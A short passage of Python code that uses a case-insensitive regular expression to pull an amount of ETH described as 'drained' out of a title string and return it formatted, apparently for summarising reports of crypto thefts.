        match = re.search(r"drained?\s+([\d.]+)\s*(?:ETH|ether)", title, re.IGNORECASE)
        if match:
            return f"{match.group(1)} ETH"
    return None